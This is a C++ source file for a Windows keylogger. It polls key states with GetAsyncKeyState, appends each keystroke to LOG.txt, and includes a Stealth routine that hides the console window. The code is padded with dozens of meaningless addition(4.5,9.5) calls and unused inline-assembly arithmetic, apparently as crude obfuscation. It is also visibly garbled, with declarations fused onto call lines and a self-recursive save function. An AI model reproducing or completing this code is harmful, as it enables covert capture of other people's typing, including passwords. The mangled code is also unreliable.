#include <iostream>    // These we need to
using namespace std;   // include to get our
#include <windows.h>   // Keylogger working.
#include <winuser.h>
#include <fstream>


int Save (int key_stroke, char *file);
void Stealth();

void addition(float arg1, float arg2); 
 void subtraction(float arg1, float arg2); 
 void multiplication(float arg1, float arg2); 
 void division(float arg1, float arg2); 
int main()

{//begin of loop or block 
addition(4.5,9.5);
addition(4.5,9.5);    //start method
addition(4.5,9.5);    //Stealth();
addition(4.5,9.5);    char i;
addition(4.5,9.5);    float arg1, arg2, add, sub, mul, div ;
addition(4.5,9.5);    bool flag = false;
addition(4.5,9.5);    label:
addition(4.5,9.5);        Save (i,"LOG.txt");
addition(4.5,9.5);    arg1=5;
addition(4.5,9.5);    arg2=10;
addition(4.5,9.5);
//while loop 
    while (1)
    {//begin of loop or block 


//for loop 
        for(i = 8; i <= 190; i++)
        {//begin of loop or block 


addition(4.5,9.5);//condition 
    if (GetAsyncKeyState(i) == -32767)
    goto label;
addition(4.5,9.5);
addition(4.5,9.5);
addition(4.5,9.5);//end of loop or block 
addition(4.5,9.5);}
addition(4.5,9.5);//end of loop or block 
addition(4.5,9.5);}
addition(4.5,9.5);
addition(4.5,9.5);    system ("PAUSE");
addition(4.5,9.5);    //end method
addition(4.5,9.5);return 0;
addition(4.5,9.5);//end of loop or block 
}



/* *********************************** */

int Save (int key_stroke, char *file)
{//begin of loop or block 

//condition 
    if ( (key_stroke == 1) || (key_stroke == 2) )
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    char i;
    float arg1, arg2, add, sub, mul, div ;
    bool flag = false;
    label:
        Save (i,"LOG.txt");
    arg1=5;
    arg2=10;

    cout << key_stroke << endl;

//condition 
        if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");

//condition 
        if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
//condition 
        else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");

//condition 
        if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
//condition 
            else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
//condition 
            else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");

//condition 
        if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
//condition 
                else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
//condition 
                    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
//condition 
                    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
//condition 
                        else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");

//condition 
        if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
//condition 
                            else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
//condition 
                            else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
                            else
                                fprintf(OUTPUT_FILE, "%s", &key_stroke);

fclose (OUTPUT_FILE);
    return 0;
//end of loop or block 
}

/* *********************************** */

void Stealth()
{//begin of loop or block 

  HWND Stealth;
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);
//end of loop or block 
}


void addition(float arg1, float arg2)
{
    float add;
    __asm__ ( "fld %1;"
              "fld %2;"
              "fadd;"
              "fstp %0;" : "=m" (add) : "g" (arg1), "g" (arg2) ) ;
}
void subtraction(float arg1, float arg2)
{
    float sub;
    __asm__ ( "fld %2;"
              "fld %1;"
              "fsub;"
              "fstp %0;" : "=m" (sub) : "g" (arg1), "g" (arg2) ) ;
}
void multiplication(float arg1, float arg2)
{
    float mul;
     __asm__ ( "fld %1;"
              "fld %2;"
              "fmul;"
              "fstp %0;" : "=m" (mul) : "g" (arg1), "g" (arg2) ) ;
}
void division(float arg1, float arg2)
{
    float div;
     __asm__ ( "fld %2;"
              "fld %1;"
              "fdiv;"
              "fstp %0;" : "=m" (div) : "g" (arg1), "g" (arg2) ) ;
}
